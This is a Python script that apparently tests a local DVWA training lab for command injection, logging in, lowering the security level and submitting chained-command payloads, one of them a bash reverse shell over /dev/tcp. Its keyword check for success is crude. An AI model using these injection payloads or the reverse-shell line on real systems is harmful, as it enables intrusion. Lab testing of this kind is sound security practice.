import requests
import re
import json

# DVWA URL and credentials
url = 'http://localhost/dvwa/login.php'
username = 'admin'
password = 'password'

# Test scenarios
test_scenarios = [
    {'name': 'Command Injection - Ping', 'payload': '127.0.0.1; ping -c 1 127.0.0.1', 'description': 'Command injection vulnerability in the ping functionality'},
    {'name': 'Command Injection - List Files', 'payload': '127.0.0.1; ls -l', 'description': 'Command injection vulnerability in the file listing functionality'},
    {'name': 'Command Injection - System Info', 'payload': '127.0.0.1; uname -a', 'description': 'Command injection vulnerability in the system information functionality'},
    {'name': 'Command Injection - Reverse Shell', 'payload': '127.0.0.1; bash -i >& /dev/tcp/127.0.0.1/8080 0>&1', 'description': 'Command injection vulnerability in the reverse shell functionality'}
]

def login(session):
    login_data = {'username': username, 'password': password, 'Login': 'Login'}
    response = session.post(url, data=login_data)
    if response.status_code != 200:
        raise Exception('Login failed')

def set_security_level(session, level):
    security_url = 'http://localhost/dvwa/security.php'
    security_data = {'security': level, 'seclev_submit': 'Submit'}
    response = session.post(security_url, data=security_data)
    if response.status_code != 200:
        raise Exception('Security level not set correctly')

def test_scenario(session, scenario):
    vuln_url = 'http://localhost/dvwa/vulnerabilities/exec/'
    payload = {'ip': scenario['payload'], 'Submit': 'Submit'}
    response = session.post(vuln_url, data=payload)
    if response.status_code != 200:
        raise Exception('Payload submission failed')
    # Improve response analysis here
    if re.search(r'command not found|ping|ls|uname|bash', response.text, re.IGNORECASE):
        return True
    return False

def generate_report(results):
    report = ''
    for scenario, result in results.items():
        if result:
            report += f'Vulnerability found: {scenario}\n'
            report += f'Description: {next(s["description"] for s in test_scenarios if s["name"] == scenario)}\n'
            report += f'Location: http://localhost/dvwa/vulnerabilities/exec/\n\n'
    with open('report.txt', 'w') as f:
        f.write(report)

def main():
    session = requests.Session()
    login(session)
    set_security_level(session, 'medium')
    results = {}
    for scenario in test_scenarios:
        results[scenario['name']] = test_scenario(session, scenario)
    generate_report(results)

if __name__ == '__main__':
    main()
